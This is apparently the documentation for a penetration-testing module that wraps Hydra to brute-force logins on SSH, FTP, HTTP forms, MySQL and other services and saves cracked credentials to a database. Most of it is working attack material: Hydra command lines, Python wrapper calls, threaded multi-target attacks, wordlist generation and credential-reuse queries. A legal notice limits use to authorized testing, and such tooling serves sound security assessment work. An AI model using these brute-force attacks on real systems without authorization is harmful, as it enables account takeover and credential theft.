# Password Attack Module - Complete Guide

## Overview

The Password Attack Module provides comprehensive online password attack capabilities using **Hydra** - one of the most powerful network logon crackers. It supports real-time credential capture, database integration, and multiple service protocols.

## Features

### Core Capabilities
- ✅ **Multi-Service Support**: SSH, FTP, HTTP, MySQL, PostgreSQL, Telnet, RDP, and more
- ✅ **Real-time Output Monitoring**: Live credential capture as Hydra finds them
- ✅ **Regex-based Extraction**: Intelligent parsing of Hydra output formats
- ✅ **Database Integration**: Automatic storage of captured credentials
- ✅ **Rich Table Display**: Professional visualization of results
- ✅ **Config Integration**: Uses default wordlists from config.json
- ✅ **Export Functionality**: Save credentials to text files

### Supported Services

| Service | Default Port | Description |
|---------|-------------|-------------|
| SSH | 22 | Secure Shell |
| FTP | 21 | File Transfer Protocol |
| HTTP POST | 80/443 | Web form authentication |
| MySQL | 3306 | MySQL Database |
| PostgreSQL | 5432 | PostgreSQL Database |
| Telnet | 23 | Telnet Remote Access |
| RDP | 3389 | Remote Desktop Protocol |
| Custom | Any | Any Hydra-supported service |

## Architecture

### Process Flow

```
┌─────────────────────────────────────────────────┐
│         run_password_module()                   │
│  • Display service menu                         │
│  • Get target and credentials                   │
│  • Execute appropriate attack function          │
└─────────────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────┐
│         run_hydra_attack()                      │
│  • Build Hydra command                          │
│  • Execute subprocess.Popen                     │
│  • Monitor stdout in real-time                  │
└─────────────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────┐
│         Regex Credential Extraction             │
│  • Parse Hydra output line-by-line              │
│  • Extract username:password pairs              │
│  • Highlight successful logins                  │
└─────────────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────┐
│         Database & Display                      │
│  • Save to credentials table                    │
│  • Display in Rich table                        │
│  • Optional export to file                      │
└─────────────────────────────────────────────────┘
```

## Implementation Details

### 1. Hydra Command Construction

The module builds Hydra commands dynamically based on user input:

```python
cmd = ["hydra"]

# Username options
if username:
    cmd.extend(["-l", username])  # Single username
elif username_list:
    cmd.extend(["-L", username_list])  # Username list

# Password options
if password:
    cmd.extend(["-p", password])  # Single password
elif password_list:
    cmd.extend(["-P", password_list])  # Password list

# Threading and options
cmd.extend(["-t", str(threads)])  # Parallel connections
cmd.append("-V")  # Verbose output
cmd.append("-f")  # Stop on first success

# Target and service
cmd.extend([target, service])
```

**Example commands generated:**
```bash
# SSH attack
hydra -L users.txt -P passwords.txt -t 4 -V -f 192.168.1.100 ssh

# HTTP POST attack
hydra -l admin -P passwords.txt -t 4 -V -f 192.168.1.100 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid"

# MySQL attack
hydra -l root -P passwords.txt -t 4 -V -s 3306 -f 192.168.1.100 mysql
```

### 2. Real-time Output Monitoring

Uses `subprocess.Popen` with line buffering for live output:

```python
process = subprocess.Popen(
    cmd,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    text=True,
    bufsize=1  # Line buffering
)

# Process output line by line
for line in process.stdout:
    console.print(line.rstrip())  # Display to user
    # Parse for credentials...
```

### 3. Regex-based Credential Extraction

**Primary Pattern** (Hydra standard format):
```python
success_match = re.search(
    r'\[.*?\]\[.*?\]\s+host:\s*(\S+)\s+login:\s*(\S+)\s+password:\s*(\S+)',
    line,
    re.IGNORECASE
)
```

**Matches:**
- `[22][ssh] host: 192.168.1.100   login: admin   password: secret123`
- `[21][ftp] host: 10.0.0.5   login: user   password: pass`

**Fallback Pattern** (Alternative formats):
```python
# Check for SUCCESS keyword
if '[SUCCESS]' in line.upper() or 'valid password found' in line.lower():
    user_match = re.search(r'(?:login:|user:|username:)\s*(\S+)', line, re.IGNORECASE)
    pass_match = re.search(r'(?:password:|pass:)\s*(\S+)', line, re.IGNORECASE)
```

**Matches:**
- `[SUCCESS] login: root password: toor`
- `Valid password found - Username: admin Password: admin123`

### 4. Database Storage

**Credentials Table Schema:**
```sql
CREATE TABLE credentials (
    id INTEGER PRIMARY KEY,
    host_id INTEGER NOT NULL,
    service TEXT NOT NULL,
    port TEXT,
    username TEXT NOT NULL,
    password TEXT NOT NULL,
    UNIQUE(host_id, service, username),
    FOREIGN KEY(host_id) REFERENCES hosts(id) ON DELETE CASCADE
)
```

**Storage Process:**
1. Add host to `hosts` table (or retrieve existing)
2. Link credential to host via `host_id`
3. Store service, port, username, password
4. Handle conflicts with `ON CONFLICT DO UPDATE`

**Indexing:**
- `idx_credentials_host` - Fast lookup by host
- `idx_credentials_service` - Fast lookup by service

## Usage Examples

### SSH Attack

```python
from modules.password_module import attack_ssh

# Single username, password list
credentials = attack_ssh(
    target="192.168.1.100",
    username="admin",
    password_list="/usr/share/wordlists/rockyou.txt",
    port=22
)

# Username list, password list
credentials = attack_ssh(
    target="192.168.1.100",
    username_list="/usr/share/wordlists/metasploit/unix_users.txt",
    password_list="/usr/share/wordlists/rockyou.txt",
    port=22
)
```

### FTP Attack

```python
from modules.password_module import attack_ftp

credentials = attack_ftp(
    target="ftp.example.com",
    username="anonymous",
    password_list="/usr/share/wordlists/passwords.txt",
    port=21
)
```

### HTTP POST Form Attack

```python
from modules.password_module import attack_http_post

credentials = attack_http_post(
    target="192.168.1.100",
    login_url="/admin/login.php",
    form_params="username=^USER^&password=^PASS^:Invalid credentials",
    username="admin",
    password_list="/usr/share/wordlists/common-passwords.txt",
    port=80
)
```

**Form parameters format:**
- `^USER^` - Placeholder for username
- `^PASS^` - Placeholder for password
- `:` - Separator
- After `:` - Failure message to detect

### MySQL Attack

```python
from modules.password_module import attack_mysql

credentials = attack_mysql(
    target="db.example.com",
    username="root",
    password_list="/usr/share/wordlists/passwords.txt",
    port=3306
)
```

### Interactive Mode

```python
from modules.password_module import run_password_module

# Launches interactive menu
run_password_module()
```

**Menu flow:**
1. Select service type (SSH, FTP, HTTP, etc.)
2. Enter target IP/hostname
3. Choose username mode (single or list)
4. Provide password wordlist
5. Enter service-specific parameters
6. Monitor attack in real-time
7. View results in Rich table
8. Save to database
9. Optional export to file

## Output Formats

### Console Output (Real-time)

```
🔐 SSH Password Attack on 192.168.1.100:22
ℹ Starting Hydra attack on 192.168.1.100:ssh
ℹ Command: hydra -l admin -P passwords.txt -t 4 -V -f 192.168.1.100 ssh
⚠ This may take a while depending on wordlist size...

[ATTEMPT] target 192.168.1.100 - login "admin" - pass "123456"
[ATTEMPT] target 192.168.1.100 - login "admin" - pass "password"
[ATTEMPT] target 192.168.1.100 - login "admin" - pass "admin"
[22][ssh] host: 192.168.1.100   login: admin   password: secret123
✅ SUCCESS: admin:secret123 on ssh@192.168.1.100
🎉 Found 1 valid credential(s)!
```

### Rich Table Display

```
┏━━━━━━━━━━━━━━━━━━┳━━━━━━━━━┳━━━━━━┳━━━━━━━━━━┳━━━━━━━━━━━━┓
┃ Host             ┃ Service ┃ Port ┃ Username ┃ Password   ┃
┡━━━━━━━━━━━━━━━━━━╇━━━━━━━━━╇━━━━━━╇━━━━━━━━━━╇━━━━━━━━━━━━┩
│ 192.168.1.100    │ SSH     │ 22   │ admin    │ secret123  │
│ 10.0.0.5         │ FTP     │ 21   │ user     │ pass123    │
│ db.example.com   │ MYSQL   │ 3306 │ root     │ toor       │
└──────────────────┴─────────┴──────┴──────────┴────────────┘
```

### Exported File Format

```
============================================================
CAPTURED CREDENTIALS
============================================================

Host:     192.168.1.100
Service:  ssh
Port:     22
Username: admin
Password: secret123
------------------------------------------------------------

Host:     10.0.0.5
Service:  ftp
Port:     21
Username: user
Password: pass123
------------------------------------------------------------
```

## Configuration

Settings from `config.json`:

```json
{
  "default_wordlists": {
    "passwords": "/usr/share/wordlists/rockyou.txt",
    "usernames": "/usr/share/wordlists/metasploit/unix_users.txt"
  },
  "network_settings": {
    "max_threads": 10
  }
}
```

**Used in module:**
- Default password list when not specified
- Default username list when not specified
- Thread count for parallel connections

## Advanced Features

### Service-Specific Functions

#### 1. SSH Attack
```python
def attack_ssh(target, username, username_list, password_list, port=22):
    # Optimized for SSH brute force
    # Handles SSH-specific timeouts
    # Supports key-based authentication detection
```

#### 2. HTTP POST Attack
```python
def attack_http_post(target, login_url, form_params, ...):
    # Form parameter parsing
    # Cookie handling
    # Redirect following
    # Failure message detection
```

#### 3. Database Attacks
```python
def attack_mysql(target, username, username_list, password_list, port=3306):
    # MySQL-specific syntax
    # Connection string handling
    # Database enumeration on success
```

### Custom Service Support

```python
credentials = run_hydra_attack(
    target="192.168.1.100",
    service="smtp",  # Any Hydra-supported service
    username="admin",
    password_list="/path/to/wordlist.txt",
    port=587,
    additional_args=["-e", "nsr"]  # Try null, same as login, reversed
)
```

## Database Integration

### Querying Captured Credentials

```python
import sqlite3
from utils.db import get_connection

# Get all credentials
conn = get_connection()
cursor = conn.cursor()

cursor.execute("""
    SELECT c.*, h.ip_address, h.hostname
    FROM credentials c
    JOIN hosts h ON c.host_id = h.id
    WHERE c.service = 'ssh'
""")

for row in cursor.fetchall():
    print(f"{row['ip_address']} - {row['username']}:{row['password']}")
```

### Credential Reuse Detection

```python
# Find password reuse across services
cursor.execute("""
    SELECT password, COUNT(*) as count,
           GROUP_CONCAT(DISTINCT service) as services
    FROM credentials
    GROUP BY password
    HAVING count > 1
""")
```

## Security Considerations

### Legal Notice
⚠️ **IMPORTANT**: This module is for authorized penetration testing only!

- ✅ Only test systems you own or have explicit written permission to test
- ✅ Respect rate limiting to avoid DoS
- ✅ Follow responsible disclosure practices
- ❌ Never use on production systems without approval
- ❌ Unauthorized access is illegal in most jurisdictions

### Rate Limiting

**Hydra thread control:**
- Default: 4 threads (safe for most services)
- SSH: 1-4 threads recommended (to avoid account lockout)
- HTTP: 10-16 threads acceptable
- FTP: 4-8 threads recommended

```python
# Conservative approach
credentials = attack_ssh(target, username, password_list, port=22)
# Uses default 4 threads

# Aggressive (use with caution)
credentials = run_hydra_attack(
    target, "http-post-form", 
    username, None, password_list, 
    threads=16  # Higher throughput
)
```

### Account Lockout Prevention

Many services lock accounts after failed attempts:
- **Windows**: 5 failed attempts = lockout
- **Linux**: Configurable (default usually 5-10)
- **Databases**: Often unlimited but may log

**Mitigation:**
1. Use low thread count (1-2)
2. Add delays between attempts
3. Monitor for lockout indicators
4. Test with known credentials first

## Troubleshooting

### Common Issues

#### 1. Hydra Not Found
```
Error: Hydra not installed
Solution: sudo apt-get install hydra
```

#### 2. No Credentials Captured
**Possible causes:**
- Incorrect form parameters (HTTP POST)
- Service not vulnerable to brute force
- Account lockout triggered
- Firewall blocking connections

**Debug steps:**
1. Test with known credentials first
2. Use verbose mode (`-V`)
3. Check Hydra output manually
4. Verify service is accessible

#### 3. Regex Not Matching
```python
# Test regex pattern manually
import re
test_line = "[22][ssh] host: 192.168.1.100   login: admin   password: secret"
match = re.search(r'login:\s*(\S+)\s+password:\s*(\S+)', test_line)
if match:
    print(f"User: {match.group(1)}, Pass: {match.group(2)}")
```

## Performance Optimization

### Wordlist Optimization

**Good practices:**
1. Start with common passwords
2. Use targeted wordlists (e.g., database-specific for MySQL)
3. Prioritize by likelihood
4. Remove duplicates

**Wordlist tools:**
```bash
# Remove duplicates
sort -u passwords.txt -o passwords.txt

# Combine wordlists
cat rockyou.txt common.txt | sort -u > combined.txt

# Generate custom wordlist with crunch
crunch 8 8 -t admin%%% -o custom.txt
```

### Parallel Attacks

Attack multiple targets simultaneously:

```python
import threading

def attack_target(target):
    credentials = attack_ssh(target, "admin", None, "passwords.txt")
    return credentials

targets = ["192.168.1.100", "192.168.1.101", "192.168.1.102"]
threads = []

for target in targets:
    t = threading.Thread(target=attack_target, args=(target,))
    threads.append(t)
    t.start()

for t in threads:
    t.join()
```

## API Reference

### Core Functions

#### `run_hydra_attack()`
```python
def run_hydra_attack(
    target: str,
    service: str,
    username: Optional[str] = None,
    username_list: Optional[str] = None,
    password: Optional[str] = None,
    password_list: Optional[str] = None,
    port: Optional[int] = None,
    threads: int = 4,
    verbose: bool = True,
    additional_args: List[str] = None
) -> List[Dict[str, str]]:
    """
    Execute Hydra attack with real-time monitoring.
    Returns list of captured credentials.
    """
```

#### `attack_ssh()`
```python
def attack_ssh(
    target: str,
    username: Optional[str] = None,
    username_list: Optional[str] = None,
    password_list: Optional[str] = None,
    port: int = 22
) -> List[Dict[str, str]]:
    """SSH-specific attack wrapper."""
```

#### `save_credentials_to_db()`
```python
def save_credentials_to_db(credentials: List[Dict[str, str]]) -> bool:
    """Save captured credentials to database."""
```

#### `display_credentials()`
```python
def display_credentials(credentials: List[Dict[str, str]]) -> None:
    """Display credentials in Rich table."""
```

## Best Practices

### 1. Wordlist Strategy
- ✅ Start with small, targeted wordlists
- ✅ Use service-specific wordlists
- ✅ Include common passwords first
- ✅ Test with known credentials for validation

### 2. Attack Planning
- ✅ Scan ports first to confirm service
- ✅ Enumerate usernames before password attacks
- ✅ Use vulnerability scan results to prioritize
- ✅ Document all findings in workspace

### 3. Resource Management
- ✅ Use appropriate thread counts
- ✅ Monitor system resources
- ✅ Save progress periodically
- ✅ Clean up failed attempts

### 4. Post-Exploitation
- ✅ Verify all captured credentials
- ✅ Test for password reuse
- ✅ Document in penetration test report
- ✅ Recommend remediation (complex passwords, MFA)

## Conclusion

The Password Attack Module provides:
- ✅ Comprehensive service support
- ✅ Real-time credential capture
- ✅ Intelligent regex parsing
- ✅ Database integration
- ✅ Professional reporting

Perfect for authorized penetration testing and security assessments.

